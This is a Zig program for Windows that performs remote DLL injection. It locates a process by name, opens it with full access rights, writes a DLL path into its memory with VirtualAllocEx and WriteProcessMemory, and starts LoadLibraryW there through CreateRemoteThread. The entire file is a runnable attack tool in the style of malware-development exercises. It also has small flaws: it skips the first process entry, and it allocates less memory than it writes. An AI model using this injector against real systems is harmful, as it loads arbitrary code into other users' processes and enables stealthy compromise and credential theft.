const std = @import("std");
const win = std.os.windows;

const WINAPI = win.WINAPI;
const HANDLE = win.HANDLE;
const BOOL = win.BOOL;
const CHAR = win.CHAR;
const CloseHandle = win.CloseHandle;
const GetLastError = win.kernel32.GetLastError;

const CREATE_TOOLHELP_SNAPSHOT_FLAGS = packed struct(u32) {
    SNAPHEAPLIST: u1 = 0,
    SNAPPROCESS: u1 = 0,
    SNAPTHREAD: u1 = 0,
    SNAPMODULE: u1 = 0,
    SNAPMODULE32: u1 = 0,
    _5: u1 = 0,
    _6: u1 = 0,
    _7: u1 = 0,
    _8: u1 = 0,
    _9: u1 = 0,
    _10: u1 = 0,
    _11: u1 = 0,
    _12: u1 = 0,
    _13: u1 = 0,
    _14: u1 = 0,
    _15: u1 = 0,
    _16: u1 = 0,
    _17: u1 = 0,
    _18: u1 = 0,
    _19: u1 = 0,
    _20: u1 = 0,
    _21: u1 = 0,
    _22: u1 = 0,
    _23: u1 = 0,
    _24: u1 = 0,
    _25: u1 = 0,
    _26: u1 = 0,
    _27: u1 = 0,
    _28: u1 = 0,
    _29: u1 = 0,
    _30: u1 = 0,
    INHERIT: u1 = 0,
};

extern "kernel32" fn CreateToolhelp32Snapshot(
    dwFlags: CREATE_TOOLHELP_SNAPSHOT_FLAGS,
    th32ProcessID: u32,
) callconv(WINAPI) ?HANDLE;

const PROCESSENTRY32 = extern struct {
    dwSize: u32,
    cntUsage: u32,
    th32ProcessID: u32,
    th32DefaultHeapID: usize,
    th32ModuleID: u32,
    cntThreads: u32,
    th32ParentProcessID: u32,
    pcPriClassBase: i32,
    dwFlags: u32,
    szExeFile: [260]CHAR,
};

extern "kernel32" fn Process32First(
    hSnapshot: ?HANDLE,
    lppe: ?*PROCESSENTRY32,
) callconv(WINAPI) BOOL;

extern "kernel32" fn Process32Next(
    hSnapshot: ?HANDLE,
    lppe: ?*PROCESSENTRY32,
) callconv(WINAPI) BOOL;

const PROCESS_ACCESS_RIGHTS = packed struct(u32) {
    TERMINATE: u1 = 0,
    CREATE_THREAD: u1 = 0,
    SET_SESSIONID: u1 = 0,
    VM_OPERATION: u1 = 0,
    VM_READ: u1 = 0,
    VM_WRITE: u1 = 0,
    DUP_HANDLE: u1 = 0,
    CREATE_PROCESS: u1 = 0,
    SET_QUOTA: u1 = 0,
    SET_INFORMATION: u1 = 0,
    QUERY_INFORMATION: u1 = 0,
    SUSPEND_RESUME: u1 = 0,
    QUERY_LIMITED_INFORMATION: u1 = 0,
    SET_LIMITED_INFORMATION: u1 = 0,
    _14: u1 = 0,
    _15: u1 = 0,
    DELETE: u1 = 0,
    READ_CONTROL: u1 = 0,
    WRITE_DAC: u1 = 0,
    WRITE_OWNER: u1 = 0,
    SYNCHRONIZE: u1 = 0,
    _21: u1 = 0,
    _22: u1 = 0,
    _23: u1 = 0,
    _24: u1 = 0,
    _25: u1 = 0,
    _26: u1 = 0,
    _27: u1 = 0,
    _28: u1 = 0,
    _29: u1 = 0,
    _30: u1 = 0,
    _31: u1 = 0,
};

const PROCESS_ALL_ACCESS = PROCESS_ACCESS_RIGHTS{
    .TERMINATE = 1,
    .CREATE_THREAD = 1,
    .SET_SESSIONID = 1,
    .VM_OPERATION = 1,
    .VM_READ = 1,
    .VM_WRITE = 1,
    .DUP_HANDLE = 1,
    .CREATE_PROCESS = 1,
    .SET_QUOTA = 1,
    .SET_INFORMATION = 1,
    .QUERY_INFORMATION = 1,
    .SUSPEND_RESUME = 1,
    .QUERY_LIMITED_INFORMATION = 1,
    .SET_LIMITED_INFORMATION = 1,
    ._14 = 1,
    ._15 = 1,
    .DELETE = 1,
    .READ_CONTROL = 1,
    .WRITE_DAC = 1,
    .WRITE_OWNER = 1,
    .SYNCHRONIZE = 1,
};

extern "kernel32" fn OpenProcess(
    dwDesiredAccess: PROCESS_ACCESS_RIGHTS,
    bInheritHandle: BOOL,
    dwProcessId: u32,
) callconv(WINAPI) ?HANDLE;

const VIRTUAL_ALLOCATION_TYPE = packed struct(u32) {
    _0: u1 = 0,
    _1: u1 = 0,
    _2: u1 = 0,
    _3: u1 = 0,
    _4: u1 = 0,
    _5: u1 = 0,
    _6: u1 = 0,
    _7: u1 = 0,
    _8: u1 = 0,
    _9: u1 = 0,
    _10: u1 = 0,
    _11: u1 = 0,
    COMMIT: u1 = 0,
    RESERVE: u1 = 0,
    REPLACE_PLACEHOLDER: u1 = 0,
    _15: u1 = 0,
    FREE: u1 = 0,
    _17: u1 = 0,
    RESERVE_PLACEHOLDER: u1 = 0,
    RESET: u1 = 0,
    _20: u1 = 0,
    _21: u1 = 0,
    _22: u1 = 0,
    _23: u1 = 0,
    RESET_UNDO: u1 = 0,
    _25: u1 = 0,
    _26: u1 = 0,
    _27: u1 = 0,
    _28: u1 = 0,
    LARGE_PAGES: u1 = 0,
    _30: u1 = 0,
    _31: u1 = 0,
};

const PAGE_PROTECTION_FLAGS = packed struct(u32) {
    PAGE_NOACCESS: u1 = 0,
    PAGE_READONLY: u1 = 0,
    PAGE_READWRITE: u1 = 0,
    PAGE_WRITECOPY: u1 = 0,
    PAGE_EXECUTE: u1 = 0,
    PAGE_EXECUTE_READ: u1 = 0,
    PAGE_EXECUTE_READWRITE: u1 = 0,
    PAGE_EXECUTE_WRITECOPY: u1 = 0,
    PAGE_GUARD: u1 = 0,
    PAGE_NOCACHE: u1 = 0,
    PAGE_WRITECOMBINE: u1 = 0,
    PAGE_GRAPHICS_NOACCESS: u1 = 0,
    PAGE_GRAPHICS_READONLY: u1 = 0,
    PAGE_GRAPHICS_READWRITE: u1 = 0,
    PAGE_GRAPHICS_EXECUTE: u1 = 0,
    PAGE_GRAPHICS_EXECUTE_READ: u1 = 0,
    PAGE_GRAPHICS_EXECUTE_READWRITE: u1 = 0,
    PAGE_GRAPHICS_COHERENT: u1 = 0,
    PAGE_GRAPHICS_NOCACHE: u1 = 0,
    SEC_64K_PAGES: u1 = 0,
    _20: u1 = 0,
    _21: u1 = 0,
    _22: u1 = 0,
    SEC_FILE: u1 = 0,
    SEC_IMAGE: u1 = 0,
    SEC_PROTECTED_IMAGE: u1 = 0,
    SEC_RESERVE: u1 = 0,
    SEC_COMMIT: u1 = 0,
    PAGE_ENCLAVE_MASK: u1 = 0,
    PAGE_ENCLAVE_UNVALIDATED: u1 = 0,
    PAGE_TARGETS_NO_UPDATE: u1 = 0,
    PAGE_ENCLAVE_THREAD_CONTROL: u1 = 0,
};

extern "kernel32" fn VirtualAllocEx(
    hProcess: ?HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flAllocationType: VIRTUAL_ALLOCATION_TYPE,
    flProtect: PAGE_PROTECTION_FLAGS,
) callconv(WINAPI) ?*anyopaque;

extern "kernel32" fn WriteProcessMemory(
    hProcess: ?HANDLE,
    lpBaseAddress: ?*anyopaque,
    lpBuffer: ?*const anyopaque,
    nSize: usize,
    lpNumberOfBytesWritten: ?*usize,
) callconv(WINAPI) BOOL;

const SECURITY_ATTRIBUTES = extern struct {
    nLength: u32,
    lpSecurityDescriptor: ?*anyopaque,
    bInheritHandle: BOOL,
};

const LPTHREAD_START_ROUTINE = *const fn (
    lpThreadParameter: ?*anyopaque,
) callconv(WINAPI) u32;

extern "kernel32" fn CreateRemoteThread(
    hProcess: ?HANDLE,
    lpThreadAttributes: ?*SECURITY_ATTRIBUTES,
    dwStackSize: usize,
    lpStartAddress: ?LPTHREAD_START_ROUTINE,
    lpParameter: ?*anyopaque,
    dwCreationFlags: u32,
    lpThreadId: ?*u32,
) callconv(WINAPI) ?HANDLE;

const VIRTUAL_FREE_TYPE = enum(u32) {
    DECOMMIT = 16384,
    RELEASE = 32768,
};

extern "kernel32" fn VirtualFreeEx(
    hProcess: ?HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: usize,
    dwFreeType: VIRTUAL_FREE_TYPE,
) callconv(WINAPI) BOOL;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 2) return error.MissingProcessName;
    if (args.len < 3) return error.MissingDLLPath;

    const process_name = args[1];
    const dll_path = args[2];

    const h_process = try getRemoteProcessHandle(process_name);
    try injectDLLToRemoteProcess(allocator, h_process, dll_path);
}

pub fn injectDLLToRemoteProcess(allocator: std.mem.Allocator, h_process: HANDLE, dll_path: []const u8) !void {
    const h_kernel32 = win.kernel32.GetModuleHandleW(std.unicode.utf8ToUtf16LeStringLiteral("kernel32.dll")) orelse {
        std.debug.print("[!] GetModuleHandleW Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GetModuleHandleWFailed;
    };

    const load_library_w = win.kernel32.GetProcAddress(h_kernel32, "LoadLibraryW") orelse {
        std.debug.print("[!] GetProcAddress Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GetProcAddressFailed;
    };

    const address = VirtualAllocEx(
        h_process,
        null,
        dll_path.len,
        .{ .RESERVE = 1, .COMMIT = 1 },
        .{ .PAGE_READWRITE = 1 },
    ) orelse {
        std.debug.print("[!] VirtualAllocEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualAllocExFailed;
    };
    defer if (VirtualFreeEx(h_process, address, 0, .RELEASE) == 0) {
        std.debug.print("[!] VirtualFreeEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
    };

    std.debug.print("[!] Memory Allocated For DLL_Path At: {*}\n", .{address});

    const dll_path_utf16 = try std.unicode.utf8ToUtf16LeAllocZ(allocator, dll_path);
    defer allocator.free(dll_path_utf16);
    const dll_path_utf16_size = (dll_path_utf16.len + 1) * @sizeOf(u16);

    var numberOfBytesWritten: usize = undefined;
    if (WriteProcessMemory(h_process, address, dll_path_utf16.ptr, dll_path_utf16_size, &numberOfBytesWritten) == 0 or numberOfBytesWritten != dll_path_utf16_size) {
        std.debug.print("[!] WriteProcessMemory Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.WriteProcessMemoryFailed;
    }

    std.debug.print("[!] Successfully Written {d} Bytes\n", .{numberOfBytesWritten});

    const h_thread = CreateRemoteThread(h_process, null, 0, @ptrCast(load_library_w), address, 0, null) orelse {
        std.debug.print("[!] CreateRemoteThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateRemoteThreadFailed;
    };
    defer CloseHandle(h_thread);

    _ = try win.WaitForSingleObject(h_thread, win.INFINITE);

    std.debug.print("[+] Done\n", .{});
}

pub fn getRemoteProcessHandle(process_name: []const u8) !HANDLE {
    const h_snapshot = CreateToolhelp32Snapshot(.{ .SNAPPROCESS = 1 }, 0) orelse {
        std.debug.print("[!] CreateToolhelp32Snapshot Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateToolhelp32SnapshotFailed;
    };
    defer CloseHandle(h_snapshot);

    var proc: PROCESSENTRY32 = undefined;

    if (Process32First(h_snapshot, &proc) == 0) {
        std.debug.print("[!] Process32First Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.Process32FirstFailed;
    }

    while (Process32Next(h_snapshot, &proc) != 0) {
        if (std.ascii.eqlIgnoreCase(process_name, proc.szExeFile[0..process_name.len])) {
            const process_id = proc.th32ProcessID;
            const h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id) orelse {
                std.debug.print("[!] OpenProcess Failed With Error: {s}\n", .{@tagName(GetLastError())});
                return error.OpenProcessFailed;
            };

            return h_process;
        }
    }

    return error.ProcessNotFound;
}
